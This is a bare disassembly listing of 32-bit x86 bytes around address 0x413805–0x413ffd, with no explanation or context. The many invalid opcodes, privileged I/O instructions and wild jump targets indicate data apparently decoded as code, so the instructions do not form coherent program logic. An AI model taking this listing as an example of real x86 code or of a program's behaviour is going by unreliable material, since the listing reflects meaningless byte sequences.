  413805:	mov    DWORD PTR [edi+ebx*2-0x4400011b],eax
  41380c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41380d:	push   ebx
  41380e:	jmp    FWORD PTR [esi-0x74bfede3]
  413814:	pop    eax
  413815:	shl    BYTE PTR [ebp+0x3a],0xbb
  413819:	sti    
  41381a:	adc    eax,0x3ce80b
  41381f:	jae    0x413876
  413821:	add    BYTE PTR [eax],al
  413823:	mov    edi,DWORD PTR [ebx-0x1878ea05]
  413829:	cmp    al,0x0
  41382b:	lods   eax,DWORD PTR ds:[esi]
  41382c:	adc    dl,BYTE PTR [ecx]
  41382e:	hlt    
  41382f:	imul   edx,DWORD PTR [ebp-0x40747b00],0xbe8b950b
  413839:	xchg   ebp,esp
  41383b:	push   es
  41383c:	sbb    al,0x4f
  41383e:	push   ebp
  41383f:	in     eax,dx
  413840:	arpl   dx,si
  413842:	push   edi
  413843:	(bad)  
  413844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413845:	out    dx,eax
  413846:	mov    esi,DWORD PTR [edx+0x5b]
  413849:	clc    
  41384a:	push   es
  41384b:	add    ah,cl
  41384d:	fwait
  41384e:	das    
  41384f:	leave  
  413850:	shl    edx,1
  413852:	xchg   cl,bl
  413854:	(bad)  
  413855:	add    ebp,DWORD PTR [eax]
  413857:	mov    cl,BYTE PTR [edi]
  413859:	fadd   DWORD PTR [eax-0x5a33416]
  41385f:	or     DWORD PTR [edi+ecx*8-0x1280247c],ecx
  413866:	(bad)  
  413867:	ror    DWORD PTR [ebx-0xc81faee],1
  41386d:	in     eax,dx
  41386e:	mov    edx,0xf916e2c2
  413873:	(bad)  
  413874:	bound  esi,QWORD PTR [eax+eax*4]
  413877:	fldenv [ebp+0x58]
  41387a:	ret    0xf60d
  41387d:	xor    edi,edi
  41387f:	(bad)  
  413880:	adc    al,0x99
  413882:	lods   eax,DWORD PTR ds:[esi]
  413883:	xor    DWORD PTR [eax-0x500a3e85],edx
  413889:	das    
  41388a:	stos   BYTE PTR es:[edi],al
  41388b:	sbb    DWORD PTR [eax-0x4700bd93],edx
  413891:	hlt    
  413892:	push   cs
  413893:	sar    BYTE PTR ds:0xa15925b0,0xa3
  41389a:	pop    edx
  41389b:	adc    cl,bl
  41389d:	cmp    DWORD PTR [ecx],ebp
  41389f:	cmp    DWORD PTR [ebx-0x5dcf031d],esi
  4138a5:	retf   
  4138a6:	mov    edi,0x75cf618a
  4138ab:	cmp    al,0x51
  4138ad:	mov    esi,0x5800740f
  4138b2:	(bad)  
  4138b3:	adc    BYTE PTR [eax+eiz*2],bh
  4138b6:	or     bl,bh
  4138b8:	xor    BYTE PTR [edx],ah
  4138ba:	fwait
  4138bb:	dec    esp
  4138bc:	scas   eax,DWORD PTR es:[edi]
  4138bd:	pop    ebp
  4138be:	dec    eax
  4138bf:	jbe    0x413932
  4138c1:	arpl   WORD PTR [ebx-0x119b7609],cx
  4138c7:	adc    BYTE PTR [edx+0x6b],dh
  4138ca:	test   BYTE PTR [ecx],0x75
  4138cd:	cmp    BYTE PTR [bx+si],cl
  4138d0:	cmc    
  4138d1:	mov    al,0xc1
  4138d3:	pop    es
  4138d4:	cmc    
  4138d5:	xchg   esi,eax
  4138d6:	sub    al,0x81
  4138d8:	ds mov ah,0x4d
  4138db:	cs or  eax,0xc677c0d4
  4138e1:	cmp    DWORD PTR [ebx+0x3c77c207],esi
  4138e7:	js     0x4138b2
  4138e9:	or     al,BYTE PTR [esp+eax*8-0x3]
  4138ed:	in     eax,dx
  4138ee:	fsubr  DWORD PTR [ebx-0x3d]
  4138f1:	outs   dx,BYTE PTR ds:[esi]
  4138f2:	test   al,0x25
  4138f4:	jns    0x4138a2
  4138f6:	repz in al,dx
  4138f8:	adc    DWORD PTR [edi+eax*4-0x5bd800ad],0xffffffbe
  413900:	push   ecx
  413901:	int3   
  413902:	mov    ds:0x548e4fb6,eax
  413907:	lods   eax,DWORD PTR ds:[esi]
  413908:	sbb    ch,dh
  41390a:	pop    ebx
  41390b:	scas   eax,DWORD PTR es:[edi]
  41390c:	push   DWORD PTR [ebx]
  41390e:	mov    esp,0xf394792d
  413913:	icebp  
  413914:	jns    0x413916
  413916:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  413918:	xlat   BYTE PTR ds:[ebx]
  413919:	push   ecx
  41391a:	pop    ebp
  41391b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41391c:	ror    BYTE PTR [ecx+eiz*2-0x61],1
  413920:	ret    0x10cc
  413923:	jmp    0xcb6a:0x1a4bbd71
  41392a:	pop    esi
  41392b:	imul   esp,ebp,0x18
  41392e:	jae    0x413983
  413930:	sub    eax,0x27ac60d8
  413935:	and    eax,0x802a82bf
  41393a:	inc    esi
  41393b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41393c:	bound  edi,QWORD PTR [edi]
  41393e:	xchg   BYTE PTR [ecx-0x254c468e],bl
  413944:	sub    BYTE PTR [ebx+esi*2],ch
  413947:	out    0x61,al
  413949:	stos   BYTE PTR es:[edi],al
  41394a:	fst    QWORD PTR [ebp-0x7a1b0bfd]
  413950:	retf   
  413951:	sti    
  413952:	fcomp  QWORD PTR [ebp+0x115aefc3]
  413958:	out    0x80,al
  41395a:	(bad)  
  41395b:	(bad)  
  41395d:	add    esi,DWORD PTR [ecx+0x3bd3728f]
  413963:	jmp    0x100:0x12ebad71
  41396a:	dec    esi
  41396b:	in     al,0xfc
  41396d:	out    dx,al
  41396e:	imul   ebx,DWORD PTR [ebp+0x19dafd24],0x73
  413975:	out    0x24,eax
  413977:	(bad)  
  413978:	mov    dl,0xe9
  41397a:	add    BYTE PTR [ecx-0x27],ah
  41397d:	sub    ecx,ebx
  41397f:	out    0x65,al
  413981:	and    al,0x1d
  413983:	pop    esi
  413984:	push   0xc
  413986:	push   0xe90011a0
  41398b:	popa   
  41398c:	aam    0x82
  41398e:	jns    0x4139f6
  413990:	fld    DWORD PTR [eax]
  413992:	jmp    0xd961:0xe9c82e9c
  413999:	xor    DWORD PTR [ebp+edx*4+0x719088f7],eax
  4139a0:	fwait
  4139a1:	(bad)  
  4139a2:	jo     0x4139be
  4139a4:	mov    ebp,0x6da16450
  4139a9:	sbb    eax,0xd5509662
  4139ae:	ret    0x528a
  4139b1:	or     al,0x12
  4139b3:	mov    dh,0xff
  4139b5:	std    
  4139b6:	pop    esi
  4139b7:	and    DWORD PTR [edx-0x40],ebx
  4139ba:	fsubr  QWORD PTR [edx-0x66]
  4139bd:	cmp    DWORD PTR [esi],edi
  4139bf:	xchg   esp,eax
  4139c0:	lock mov BYTE PTR [ebp-0x5a7629c3],ah
  4139c7:	inc    ebp
  4139c8:	xchg   esi,eax
  4139c9:	mov    DWORD PTR [eiz*8-0x576a17f0],ebx
  4139d0:	fld    DWORD PTR [eax]
  4139d2:	jb     0x41395e
  4139d4:	mov    ebp,0x502d7214
  4139d9:	clc    
  4139da:	add    edx,ecx
  4139dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139dd:	add    ch,cl
  4139df:	add    dl,dh
  4139e1:	mov    WORD PTR [eax+eax*1],fs
  4139e4:	sbb    esi,DWORD PTR [ebp+edi*1-0x17d28fa7]
  4139eb:	mov    eax,0xb9fb1a89
  4139f0:	inc    edi
  4139f1:	cmp    BYTE PTR [eax+0x0],al
  4139f4:	jo     0x413a13
  4139f6:	cmp    edi,0x50c390cc
  4139fc:	inc    eax
  4139fd:	sbb    eax,0x90acf681
  413a02:	(bad)  
  413a03:	push   eax
  413a04:	dec    esi
  413a05:	sahf   
  413a06:	and    al,0x28
  413a08:	pop    ebx
  413a09:	mov    bh,0x0
  413a0b:	push   0xffffffcb
  413a0d:	mov    cl,0xca
  413a0f:	add    BYTE PTR [ebx-0x73201727],bh
  413a15:	fild   DWORD PTR [eax]
  413a17:	add    edi,0xffffffc1
  413a1a:	xchg   edi,ecx
  413a1c:	jecxz  0x4139d5
  413a1e:	loopne 0x413a21
  413a20:	jnp    0x413a78
  413a22:	into   
  413a23:	call   0x3e73cc
  413a28:	lock test DWORD PTR [eax+edx*2],esp
  413a2c:	mov    al,bh
  413a2e:	xchg   bl,bh
  413a30:	mov    al,ds:0xf01824a5
  413a35:	popf   
  413a36:	and    al,0x1c
  413a38:	rol    BYTE PTR [esp+0xb057010],cl
  413a3f:	sbb    BYTE PTR [ebx+0x18],0xfb
  413a43:	inc    DWORD PTR [eax]
  413a45:	std    
  413a46:	jns    0x4139cf
  413a48:	(bad)  
  413a49:	fadd   QWORD PTR [ebx+0x1f2fc47f]
  413a4f:	or     BYTE PTR [eax],al
  413a51:	aad    0x53
  413a53:	in     eax,dx
  413a54:	(bad)  
  413a55:	cmc    
  413a56:	aam    0x50
  413a58:	call   DWORD PTR [esi]
  413a5a:	loope  0x413a6a
  413a5c:	inc    eax
  413a5d:	(bad)
  413a62:	cld    
  413a63:	mov    eax,DWORD PTR [esi+0x5e]
  413a66:	imul   eax,DWORD PTR [edi+0x8],0xc15fbce9
  413a6d:	mov    WORD PTR [ebx-0x72],es
  413a70:	out    dx,eax
  413a71:	xor    ebx,esi
  413a73:	clc    
  413a74:	cmp    eax,0x468be16c
  413a79:	add    di,ax
  413a7c:	mov    bh,0xd5
  413a7e:	in     eax,0x98
  413a80:	adc    ah,BYTE PTR [edx]
  413a82:	repnz inc edi
  413a84:	cmp    DWORD PTR [eax+eiz*4-0x1d37651],eax
  413a8b:	test   al,0xaf
  413a8d:	xchg   ebp,eax
  413a8e:	icebp  
  413a8f:	add    BYTE PTR [ebx-0x2aef9dc],cl
  413a95:	dec    edi
  413a96:	pushw  ss
  413a98:	inc    eax
  413a99:	bound  esp,QWORD PTR [ebx-0x5bd03e9e]
  413a9f:	mov    ebp,edi
  413aa1:	(bad)  
  413aa3:	or     al,0x53
  413aa5:	test   DWORD PTR ds:0x2200124d,eax
  413aab:	repnz cmp DWORD PTR [esi+0x6a],0xfffffff2
  413ab0:	xor    eax,0xf3cb1155
  413ab5:	fdiv   DWORD PTR [ecx]
  413ab7:	jnp    0x413ab2
  413ab9:	sbb    eax,0x468bc6d4
  413abe:	pop    esi
  413abf:	outs   dx,DWORD PTR ds:[esi]
  413ac0:	add    BYTE PTR [eax+0x69ef0e62],bh
  413ac6:	bound  ebx,QWORD PTR [ebx+0xd3db7f8]
  413acc:	mov    DWORD PTR [edx],edx
  413ace:	mov    ds:0xb7c085f2,al
  413ad3:	or     eax,0xd95e468c
  413ad8:	es clc 
  413ada:	aad    0xe3
  413adc:	repz fwait
  413ade:	jo     0x413a79
  413ae0:	out    0x8c,eax
  413ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae3:	(bad)  [edx-0x18]
  413ae6:	int    0xd8
  413ae8:	adc    cl,BYTE PTR [esi]
  413aea:	jmp    0x413a7e
  413aec:	jecxz  0x413a7a
  413aee:	pop    esi
  413aef:	and    ah,BYTE PTR [eax+0x8]
  413af2:	aad    0x97
  413af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413af5:	cld    
  413af6:	daa    
  413af7:	stos   DWORD PTR es:[di],eax
  413af9:	mov    WORD PTR [ebx-0x16fa36e7],?
  413aff:	xchg   edx,eax
  413b00:	jmp    0x413a8c
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	icebp  
  413b04:	data16 loope 0x413acc
  413b07:	jecxz  0x413b2e
  413b09:	pop    ebp
  413b0a:	adc    esp,esp
  413b0c:	rol    DWORD PTR [ebx+0x0],cl
  413b0f:	push   eax
  413b10:	cdq    
  413b11:	out    0x61,eax
  413b13:	or     DWORD PTR [eax],ebx
  413b15:	sbb    dl,BYTE PTR [edi+0xc]
  413b18:	push   eax
  413b19:	cwde   
  413b1a:	mov    cs,WORD PTR [edx*8-0x6a8e3ecc]
  413b21:	stc    
  413b22:	inc    ebx
  413b23:	bound  ebp,QWORD PTR [eax-0x2ed8054e]
  413b29:	cld    
  413b2a:	cmp    esi,DWORD PTR ds:0xee17c385
  413b30:	bound  cx,DWORD PTR [ecx]
  413b33:	fst    DWORD PTR [edx+0x5e4e8ee3]
  413b39:	jmp    0x413b3e
  413b3b:	(bad)  
  413b3c:	(bad)  [edi+0x48]
  413b3f:	xor    al,0xd9
  413b41:	out    0x87,eax
  413b43:	and    ch,BYTE PTR [esi-0x54]
  413b46:	pop    eax
  413b47:	mov    bl,0x6f
  413b49:	jmp    0x413b0b
  413b4b:	mov    dh,0xbd
  413b4d:	add    eax,ecx
  413b4f:	scas   al,BYTE PTR es:[edi]
  413b50:	mov    ebp,0x6e230d00
  413b55:	and    al,0x5
  413b57:	(bad)  
  413b58:	in     al,0x12
  413b5a:	cmc    
  413b5b:	jbe    0x413af6
  413b5d:	add    BYTE PTR [edx-0x27],dh
  413b60:	push   esi
  413b61:	std    
  413b62:	popf   
  413b63:	pop    ss
  413b64:	lods   al,BYTE PTR ds:[esi]
  413b65:	pop    esp
  413b66:	vpcmpgtd ymm0,ymm0,YMMWORD PTR [edi-0x6d]
  413b6b:	mov    BYTE PTR [bx+di-0x2],dl
  413b6f:	sub    al,0xbd
  413b71:	xor    BYTE PTR [ebx+0x6a8d2200],al
  413b77:	out    dx,al
  413b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b79:	mov    BYTE PTR [edx+edi*8],0x21
  413b7d:	fld    DWORD PTR [ebx-0x2586457]
  413b83:	cld    
  413b84:	and    eax,0x31e940c7
  413b89:	mov    ebp,?
  413b8b:	fdiv   st(5),st
  413b8d:	mov    DWORD PTR [eax-0x17],0x5112e40c
  413b94:	push   eax
  413b95:	cdq    
  413b96:	add    BYTE PTR [edx+0x4c],ah
  413b99:	and    ah,dl
  413b9b:	jmp    0x413b8f
  413b9d:	xchg   ebx,eax
  413b9e:	add    al,0x91
  413ba0:	mov    ebp,0x2ce8fefe
  413ba5:	xchg   ch,bh
  413ba7:	hlt    
  413ba8:	and    edi,eax
  413baa:	inc    eax
  413bab:	jmp    0xaacbb9cf
  413bb0:	sbb    DWORD PTR [edi],edx
  413bb2:	adc    al,0xe9
  413bb4:	fcom   st(3)
  413bb6:	mov    DWORD PTR [edi],esp
  413bb8:	pop    edx
  413bb9:	mov    WORD PTR [edi+0x5e3ee25],es
  413bbf:	pop    esi
  413bc0:	jnp    0x413b93
  413bc2:	adc    DWORD PTR [ecx+0x41ff2861],ebp
  413bc8:	sub    DWORD PTR [eax+0x2cb00056],ecx
  413bce:	push   ebx
  413bcf:	(bad)  
  413bd0:	cmc    
  413bd1:	rcl    DWORD PTR [ebx-0x1],1
  413bd4:	push   cs
  413bd5:	xchg   edx,eax
  413bd6:	adc    al,BYTE PTR [eax+0x0]
  413bd9:	cmp    esp,DWORD PTR [ebx]
  413bdb:	inc    esi
  413bdc:	or     ah,bl
  413bde:	and    dl,BYTE PTR [ecx]
  413be0:	inc    eax
  413be1:	sbb    DWORD PTR [esi-0x19c4cd00],edx
  413be7:	xlat   BYTE PTR ds:[ebx]
  413be8:	inc    eax
  413be9:	xor    al,ah
  413beb:	jbe    0x413c18
  413bed:	jo     0x413bc2
  413bef:	push   0xffffffff
  413bf1:	fisttp DWORD PTR [esi+0x46]
  413bf4:	add    al,0x20
  413bf6:	jns    0x6acecf00
  413bfc:	inc    eax
  413bfd:	and    ebx,esi
  413bff:	les    ecx,FWORD PTR [edi]
  413c01:	mov    DWORD PTR [eax+edx*2],ebx
  413c04:	dec    esi
  413c06:	aad    0xf
  413c08:	inc    eax
  413c09:	mov    ebx,0x6d75c050
  413c0e:	push   esi
  413c0f:	mov    edi,0x58dc1140
  413c14:	cmp    edx,DWORD PTR [ebp-0x2fcc2e59]
  413c1a:	xchg   esi,eax
  413c1b:	push   ebx
  413c1c:	call   FWORD PTR [esi-0x74bfed6f]
  413c22:	and    cl,BYTE PTR [esi+0x8]
  413c25:	dec    esp
  413c26:	and    dl,BYTE PTR [ecx]
  413c28:	inc    eax
  413c29:	mov    DWORD PTR [ebp+0x4f455f00],edx
  413c2f:	mov    edi,0xd9c95b
  413c34:	xor    dl,al
  413c36:	fild   WORD PTR cs:[ebx+0x554fd1e7]
  413c3d:	add    BYTE PTR ds:0xbc02f88,bl
  413c43:	mov    bl,0x21
  413c45:	mov    BYTE PTR [edx+0x2e],ah
  413c48:	in     eax,0x14
  413c4a:	add    al,0x13
  413c4c:	and    al,BYTE PTR [edx+eiz*2+0x37]
  413c50:	mov    bl,BYTE PTR [esi]
  413c52:	fistp  QWORD PTR [ebx+0x605d7135]
  413c58:	inc    ebx
  413c59:	add    al,0xd9
  413c5b:	and    BYTE PTR [ecx+0x456a3789],bh
  413c61:	and    al,0x7a
  413c63:	retf   0xd1be
  413c66:	(bad)  
  413c68:	cmp    eax,0x8b514464
  413c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c6f:	push   cs
  413c70:	adc    eax,0x27328850
  413c75:	push   ds
  413c76:	xchg   edi,eax
  413c77:	pop    esp
  413c78:	mov    esi,0x14624ffd
  413c7d:	inc    eax
  413c7e:	bound  ebp,QWORD PTR [ebp-0x3c]
  413c81:	je     0x413c1b
  413c83:	ret    
  413c84:	les    edx,FWORD PTR [eax-0x27]
  413c87:	scas   al,BYTE PTR es:[edi]
  413c88:	call   0xb7741da8
  413c8d:	push   eax
  413c8e:	adc    DWORD PTR [ebp+0x5b5fd2a],edi
  413c94:	cmp    DWORD PTR [edi],ecx
  413c96:	and    dh,dl
  413c98:	out    dx,eax
  413c99:	(bad)  
  413c9a:	cmp    cl,dh
  413c9c:	test   eax,eax
  413c9e:	cmp    ah,bh
  413ca0:	jb     0x413c79
  413ca2:	add    BYTE PTR [ebp-0x4b],ah
  413ca5:	fmul   QWORD PTR [ebx+0x50150e26]
  413cab:	test   esi,eax
  413cad:	call   0x563944c9
  413cb2:	push   0x75
  413cb4:	pop    edi
  413cb5:	adc    eax,0x4b25370
  413cba:	test   BYTE PTR [ecx+0x223108e5],cl
  413cc0:	fldcw  WORD PTR [edi+0x48]
  413cc3:	jle    0x413c91
  413cc5:	push   edx
  413cc6:	or     al,bl
  413cc8:	xchg   esp,eax
  413cc9:	or     edx,DWORD PTR [ecx]
  413ccb:	jecxz  0x413ce3
  413ccd:	test   DWORD PTR [ecx+esi*4+0x5a],0x84995da6
  413cd5:	push   0xffffffc8
  413cd7:	pop    esi
  413cd8:	sbb    ebp,ebx
  413cda:	add    edx,DWORD PTR [eax+0x69891854]
  413ce0:	xchg   ebp,eax
  413ce1:	xchg   ebx,eax
  413ce2:	inc    edi
  413ce3:	(bad)  
  413ce5:	jno    0x413ce4
  413ce7:	arpl   cx,bx
  413ce9:	sub    dl,BYTE PTR [ecx+0x53]
  413cec:	add    al,0xb6
  413cee:	jnp    0x413c76
  413cf0:	jl     0x413c9d
  413cf2:	add    ebp,ebx
  413cf4:	adc    eax,eax
  413cf6:	pop    ebx
  413cf7:	mul    BYTE PTR [esp+ecx*4-0x76]
  413cfb:	mov    bl,ch
  413cfd:	pop    esi
  413cfe:	sbb    al,0xe3
  413d00:	sbb    edi,esi
  413d02:	and    BYTE PTR [edx+0xba68c8],0x32
  413d09:	(bad)  
  413d0b:	add    edx,DWORD PTR [eax-0xf]
  413d0e:	inc    eax
  413d0f:	inc    esp
  413d10:	dec    edx
  413d11:	fincstp 
  413d13:	add    esp,DWORD PTR [edx+0x71]
  413d16:	out    dx,al
  413d17:	push   es
  413d18:	(bad)  
  413d19:	fstp   DWORD PTR [edx]
  413d1b:	sub    ah,BYTE PTR [edi+0x6d37d3df]
  413d21:	cdq    
  413d22:	out    0x88,eax
  413d24:	call   0x5587:0x57379e55
  413d2b:	and    eax,DWORD PTR [ebx]
  413d2d:	xchg   ebp,eax
  413d2e:	out    0x88,eax
  413d30:	adc    al,0xe1
  413d32:	pop    ss
  413d33:	push   ebp
  413d34:	ja     0x413d9c
  413d36:	jnp    0x413ce3
  413d38:	lock or eax,DWORD PTR [eax]
  413d3b:	jmp    0xf60199a1
  413d40:	jno    0x413d98
  413d42:	ds jmp 0x58a2:0xe5465219
  413d4a:	(bad)  
  413d4b:	stc    
  413d4c:	loop   0x413d2e
  413d4e:	and    bl,bl
  413d50:	push   ds
  413d51:	add    BYTE PTR [ecx+0x46c3c42],0x79
  413d58:	pusha  
  413d59:	lock pop es
  413d5b:	cwde   
  413d5c:	stc    
  413d5d:	add    bh,dh
  413d5f:	fisubr WORD PTR cs:[ebx+0x18bac6c0]
  413d66:	lahf   
  413d67:	xor    eax,0x4a009975
  413d6c:	add    BYTE PTR [ecx-0x7f16bb88],ch
  413d72:	mov    ebp,0x3861a913
  413d77:	push   0x9fd9a58a
  413d7c:	or     DWORD PTR [ecx+ebx*4+0x0],0x4478994a
  413d84:	jmp    0x295502c7
  413d89:	data16 cmp BYTE PTR [eax-0x6026ddb6],cl
  413d90:	popf   
  413d91:	push   edx
  413d92:	cdq    
  413d93:	add    BYTE PTR [edx-0x16bb872a],cl
  413d99:	inc    esi
  413d9a:	mov    ch,0x13
  413d9c:	sub    DWORD PTR [esi+0x38],ebx
  413d9f:	test   al,0x4a
  413da1:	and    bl,cl
  413da3:	lahf   
  413da4:	adc    eax,0x4a009973
  413da9:	push   cs
  413daa:	js     0x413df0
  413dac:	jmp    0x295546af
  413db1:	data16 cmp al,cl
  413db4:	add    BYTE PTR [eax-0x67],ch
  413db7:	add    BYTE PTR [ecx+0x40c983],ah
  413dbd:	sbb    ch,bh
  413dbf:	pop    esi
  413dc0:	inc    esp
  413dc1:	dec    ebx
  413dc2:	jne    0x413df0
  413dc4:	adc    eax,0xe89fda0b
  413dc9:	sbb    BYTE PTR [esi-0x36e85f00],bl
  413dcf:	inc    eax
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	call   0x4b859cf3
  413dd7:	jne    0x413e19
  413dd9:	adc    eax,0x89fd9fb
  413dde:	pop    ss
  413ddf:	sahf   
  413de0:	add    BYTE PTR [ecx+0x40c917],ah
  413de6:	test   al,0xbd
  413de8:	fs inc esp
  413dea:	sti    
  413deb:	je     0x413e61
  413ded:	adc    eax,0x289fd9bb
  413df2:	out    0x9d,eax
  413df4:	add    BYTE PTR [ecx+0x40c963],ah
  413dfa:	cwde   
  413dfb:	frstor [eax+0x44]
  413dfe:	sti    
  413dff:	je     0x413e1d
  413e01:	adc    al,0xb
  413e03:	ficomp DWORD PTR [edi+0x992748]
  413e09:	mov    eax,ds:0x40ce03
  413e0e:	fadd   DWORD PTR [ecx+0x74cb4464]
  413e14:	xor    al,0x14
  413e16:	mov    edx,ebp
  413e18:	lahf   
  413e19:	push   0xa1009927
  413e1e:	ret    
  413e1f:	int    0x40
  413e21:	add    al,ch
  413e23:	mov    eax,ds:0x748b4464
  413e28:	loopne 0x413e3e
  413e2a:	cmp    edx,ebp
  413e2c:	lahf   
  413e2d:	mov    BYTE PTR [edx-0x34],ah
  413e30:	inc    eax
  413e31:	add    bl,al
  413e33:	das    
  413e34:	or     eax,0x93620040
  413e39:	cdq    
  413e3a:	fs lock arpl WORD PTR es:[edi+ecx*2],cx
  413e40:	mov    al,0x4
  413e42:	mov    eax,ds:0x40d70a
  413e47:	add    ebx,DWORD PTR [ebx]
  413e49:	or     eax,0x794f6240
  413e4e:	fs sahf 
  413e50:	repnz arpl WORD PTR [edi+edx*2+0x32],bx
  413e55:	add    DWORD PTR [ecx+0x3d0f2a],esp
  413e5b:	add    edi,ebx
  413e5d:	or     al,0x40
  413e5f:	bound  ecx,QWORD PTR [edi-0x27]
  413e62:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413e64:	repnz arpl WORD PTR [eax],dx
  413e67:	outs   dx,BYTE PTR ds:[esi]
  413e68:	xor    al,BYTE PTR [ecx]
  413e6a:	mov    eax,ds:0x3d56fa
  413e6f:	ret    
  413e70:	(bad)  
  413e71:	push   ss
  413e72:	inc    eax
  413e73:	bound  ecx,QWORD PTR [edi-0xd619b47]
  413e79:	arpl   WORD PTR [esi+edx*2+0x5aa10132],di
  413e80:	dec    ebp
  413e81:	cmp    eax,0xd070300
  413e86:	inc    eax
  413e87:	bound  ecx,QWORD PTR [edi+0x1c]
  413e8a:	arpl   WORD PTR [esi],sp
  413e8c:	repnz popa 
  413e8e:	hlt    
  413e8f:	jno    0x413e43
  413e91:	add    al,0xa1
  413e93:	mov    dl,BYTE PTR [ebp+0x2f030040]
  413e99:	adc    BYTE PTR [eax+0x0],al
  413e9c:	bound  ecx,QWORD PTR [edi-0x4]
  413e9f:	bound  ebx,QWORD PTR [esi]
  413ea1:	repnz popa 
  413ea3:	xor    BYTE PTR [esi-0x4e],dh
  413ea6:	add    al,0xa1
  413ea8:	sub    bl,cl
  413eaa:	or     al,0x40
  413eac:	bound  edi,QWORD PTR [edx]
  413eae:	jecxz  0x413ebf
  413eb0:	and    bl,cl
  413eb2:	dec    edx
  413eb3:	pop    esp
  413eb4:	add    DWORD PTR [ebp-0x3a999d19],edx
  413eba:	daa    
  413ebb:	add    al,0xc3
  413ebd:	jno    0x413ec3
  413ebf:	inc    eax
  413ec0:	bound  edi,QWORD PTR [edx]
  413ec2:	outs   dx,DWORD PTR ds:[esi]
  413ec3:	adc    eax,0x3c4ad9a2
  413ec8:	rcl    DWORD PTR [ebp-0x3a9d9d19],0xa7
  413ecf:	add    eax,DWORD PTR [ebx]
  413ed1:	push   ecx
  413ed2:	int3   
  413ed3:	aas    
  413ed4:	bound  edi,QWORD PTR [edx]
  413ed6:	adc    DWORD PTR [edx+eiz*4],0xffffffd9
  413eda:	mov    bl,BYTE PTR [ecx+eax*8+0x57aae795]
  413ee1:	(bad)  ds:0x6ece3b9
  413ee7:	push   ebp
  413ee8:	mov    cl,0x83
  413eea:	jb     0x413f1c
  413eec:	inc    esi
  413eed:	test   eax,0xa82d8cb6
  413ef2:	and    BYTE PTR [ebx-0x17],dl
  413ef5:	xchg   edx,eax
  413ef6:	lahf   
  413ef7:	hlt    
  413ef8:	div    BYTE PTR [edx-0x40]
  413efb:	sti    
  413efc:	jnp    0x413ed8
  413efe:	out    dx,al
  413eff:	aas    
  413f00:	add    BYTE PTR [ebp-0x16a22292],ah
  413f06:	mov    ebx,es
  413f08:	jecxz  0x413ef4
  413f0a:	jmp    0x413f7b
  413f0c:	aas    
  413f0d:	xchg   cl,al
  413f0f:	iret   
  413f10:	cs cli 
  413f12:	fsub   st,st(7)
  413f14:	mov    WORD PTR [eax+esi*8-0x244a79c7],gs
  413f1b:	dec    esp
  413f1c:	test   DWORD PTR [edx-0x24f5c630],ebp
  413f22:	push   0x0
  413f24:	fstp   DWORD PTR [eax+esi*8]
  413f27:	jb     0x413f0e
  413f29:	out    0xed,al
  413f2b:	call   0x2c59261a
  413f30:	jb     0x413f90
  413f32:	push   edx
  413f33:	mov    eax,0xd96079
  413f38:	pop    esp
  413f39:	xor    dh,BYTE PTR [ecx-0x72a379aa]
  413f3f:	adc    ch,BYTE PTR [ecx]
  413f41:	pop    esi
  413f42:	push   edx
  413f43:	inc    ebp
  413f44:	loope  0x413f2e
  413f46:	xchg   ebp,eax
  413f47:	and    al,0xcd
  413f49:	out    0x94,al
  413f4b:	sbb    BYTE PTR [edi-0x2db6a28],bh
  413f51:	or     al,bh
  413f53:	inc    eax
  413f54:	sti    
  413f55:	mov    eax,ds:0x159d89d9
  413f5a:	retf   
  413f5b:	or     eax,0x4891607e
  413f60:	mov    ch,0x55
  413f62:	pop    eax
  413f63:	call   0xd58e4044
  413f68:	xor    DWORD PTR [ecx],ebp
  413f6a:	mov    ch,0x89
  413f6d:	jmp    0xd960:0xff805043
  413f74:	add    BYTE PTR [edx],al
  413f76:	push   0xe6870150
  413f7b:	pop    ecx
  413f7c:	sbb    al,0xe8
  413f7e:	popa   
  413f7f:	(bad)  [ecx+0x31a7057d]
  413f85:	sbb    ebx,eax
  413f87:	test   DWORD PTR [eax],edx
  413f89:	xchg   eax,ebp
  413f8b:	xchg   ebp,eax
  413f8c:	and    al,0x9
  413f8e:	aaa    
  413f8f:	dec    esi
  413f90:	jne    0x413f89
  413f92:	fcom   DWORD PTR [ebx]
  413f94:	or     eax,0x166fa02d
  413f99:	pop    esp
  413f9a:	adc    dh,BYTE PTR [ebp-0x7bb6ffe0]
  413fa0:	jg     0x413f62
  413fa2:	mov    edi,0xa301b286
  413fa7:	sbb    bl,BYTE PTR [edi+0x444d8b01]
  413fad:	and    al,0x8f
  413faf:	pop    ecx
  413fb0:	shl    BYTE PTR [ebp+0x7f],0xe8
  413fb4:	mov    esp,0x74e4beb
  413fb9:	push   eax
  413fba:	jecxz  0x414021
  413fbc:	mov    DWORD PTR [ecx],eax
  413fbe:	jnp    0x41400f
  413fc0:	dec    esp
  413fc1:	and    al,0x8f
  413fc3:	dec    esi
  413fc4:	inc    esp
  413fc5:	and    al,0x1f
  413fc7:	mov    BYTE PTR cs:[eax+eax*1-0x3c],bh
  413fcc:	and    al,BYTE PTR [ecx-0xd08d013]
  413fd2:	inc    ebp
  413fd3:	cmp    edx,ebp
  413fd5:	je     0x413ff4
  413fd7:	ror    dh,0x2f
  413fda:	rcl    BYTE PTR [edx-0x66],0x10
  413fde:	mov    esi,DWORD PTR [edx+0x3bfffd4d]
  413fe4:	rol    DWORD PTR [eax+esi*8-0x78],cl
  413fe8:	sbb    ebx,DWORD PTR [eax]
  413fea:	push   esi
  413feb:	inc    esp
  413fec:	test   eax,0x84731424
  413ff1:	or     DWORD PTR [ecx],eax
  413ff3:	sti    
  413ff4:	dec    edi
  413ff5:	inc    esp
  413ff6:	and    al,0x1f
  413ff8:	sbb    DWORD PTR [esi+0x5d],0xffffffb0
  413ffc:	push   esi
  413ffd:	les    esp,FWORD PTR [eax]
